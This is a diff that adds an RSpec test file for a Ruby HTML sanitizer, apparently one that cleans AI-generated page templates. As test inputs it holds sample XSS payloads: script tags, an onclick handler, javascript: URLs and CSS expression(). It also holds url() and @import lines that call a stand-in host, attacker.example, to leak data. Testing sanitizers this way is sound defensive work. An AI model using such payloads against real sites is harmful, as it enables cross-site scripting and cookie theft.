@@ -1,0 +1,78 @@
+# frozen_string_literal: true
+
+require "spec_helper"
+
+describe Ai::PageSanitizer do
+  describe ".sanitize" do
+    it "returns an empty string for blank input" do
+      expect(described_class.sanitize(nil)).to eq("")
+      expect(described_class.sanitize("")).to eq("")
+    end
+
+    it "preserves allowed tags and attributes" do
+      html = %(<div class="hero"><h1>Hi</h1><a href="https://example.com">link</a></div>)
+      out = described_class.sanitize(html)
+      expect(out).to include("<h1>Hi</h1>")
+      expect(out).to include(%(class="hero"))
+      expect(out).to include(%(href="https://example.com"))
+    end
+
+    it "strips <script> tags so they cannot execute" do
+      html = %(<div>hi</div><script>alert(1)</script>)
+      out = described_class.sanitize(html)
+      expect(out).not_to include("<script")
+      expect(out).not_to include("</script>")
+    end
+
+    it "strips inline event handler attributes" do
+      html = %(<div onclick="steal()">click</div>)
+      out = described_class.sanitize(html)
+      expect(out).not_to include("onclick")
+      expect(out).not_to include("steal()")
+    end
+
+    it "strips javascript: URLs" do
+      html = %(<a href="javascript:alert(1)">x</a>)
+      out = described_class.sanitize(html)
+      expect(out).not_to include("javascript:")
+    end
+
+    it "strips CSS expression() in style content" do
+      html = %(<div style="width:expression(alert(1))">hi</div>)
+      out = described_class.sanitize(html)
+      expect(out).not_to include("expression(")
+    end
+
+    # Regression: style attribute must not be allow-listed. Even if it were,
+    # url(...) in style values would let a malicious/hallucinated template
+    # exfiltrate referer/cookies from any non-sandboxed render context
+    # (admin preview, email, etc.).
+    it "strips the style attribute entirely" do
+      html = %(<div style="color:red">hi</div>)
+      out = described_class.sanitize(html)
+      expect(out).not_to include("style=")
+      expect(out).to include("hi")
+    end
+
+    it "neutralizes url() exfiltration vectors in style attributes" do
+      html = %(<div style="background:url(https://attacker.example/leak?c=1)">hi</div>)
+      out = described_class.sanitize(html)
+      expect(out).not_to include("attacker.example")
+      expect(out).not_to include("url(")
+    end
+
+    it "neutralizes @import in style attributes" do
+      html = %(<div style="@import url(https://attacker.example/x.css)">hi</div>)
+      out = described_class.sanitize(html)
+      expect(out).not_to include("@import")
+      expect(out).not_to include("attacker.example")
+    end
+
+    it "strips disallowed tags but keeps their inner text" do
+      html = %(<form><input type="text"><iframe src="evil"></iframe>kept</form>)
+      out = described_class.sanitize(html)
+      expect(out).not_to include("<iframe")
+      expect(out).to include("kept")
+    end
+  end
+end
